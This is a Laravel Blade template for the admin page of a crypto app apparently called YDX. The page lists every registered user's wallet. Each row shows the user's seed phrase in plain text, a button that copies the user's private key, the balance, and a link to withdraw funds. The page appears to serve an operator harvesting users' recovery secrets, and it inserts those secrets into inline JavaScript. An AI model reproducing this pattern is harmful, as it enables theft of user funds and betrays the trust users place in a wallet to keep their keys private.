@extends('layouts.app')
    @section('content')
      
                <!-- Begin Page Content -->
                <div class="container-fluid">

                    <!-- Page Heading -->
                    <h1 class="h3 mb-2 text-gray-800">YDX App users</h1>
                    <p class="mb-4">Below are the users, those are currently registered on YDX app.</p>

                    <!-- DataTales Example -->
                    <div class="card shadow mb-4">
                        <div class="card-header py-3">
                            <h6 class="m-0 font-weight-bold text-primary">Users list</h6>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
                                    <thead>
                                        <tr>
                                            <th>#</th>
                                            <th>Mnemonics</th>
                                            <th>Wallet Address</th>
                                            <th>Current Balance</th>
                                            <th>Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        @php $i = 1; @endphp
                                        @foreach($response as $wallet)
                                        <tr>
                                            <td> {{ $i }} </td>
                                            <td>
                                                <div style="display: flex; flex-direction: row; justify-content: space-between; background-color: #f3f3f3; border-radius: 10px; color: black; padding: 5px; align-items: center;">
                                                    <p style="margin-bottom: 0px">
                                                        {{ $wallet['mnemonics'] }}
                                                    </p>
                                                    <button class="btn btn-sm btn-secondary"  onClick="copy('{{ $wallet['mnemonics'] }}')">
                                                        Copy
                                                    </button>
                                                </div>
                                            </td>
                                            <td>
                                                <div style="display: flex; flex-direction: row; justify-content: space-between; background-color: #f3f3f3; border-radius: 10px; color: black; padding: 5px; align-items: center;">
                                                    <p style="margin-bottom: 0px">
                                                        {{ $wallet['wallet_address'] }}
                                                    </p>
                                                    <button class="btn btn-sm btn-secondary"  onClick="copy('{{ $wallet['wallet_address'] }}')">
                                                        Copy
                                                    </button>
                                                </div>
                                            </td>
                                            <td>{{ $wallet['balance'] }} {{ $wallet['tag'] }}</td>
                                            <td>
                                                <button class="btn btn-sm btn-warning"  onClick="copy('{{ $wallet['private_key'] }}')">
                                                    Copy Private key
                                                </button>
                                                <a href="{{ url('wallet?wallet-id='.$wallet['id']) }}" class="btn btn-sm btn-success">explore wallets</a>
                                                <a href="{{ url('wallet-withdraw?wallet-id='.$wallet['id']) }}" class="btn btn-sm btn-info">withdraw</a>
                                            </td>
                                        </tr>
                                         @php $i++; @endphp
                                        @endforeach
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>

                </div>
                <!-- /.container-fluid -->

  @endsection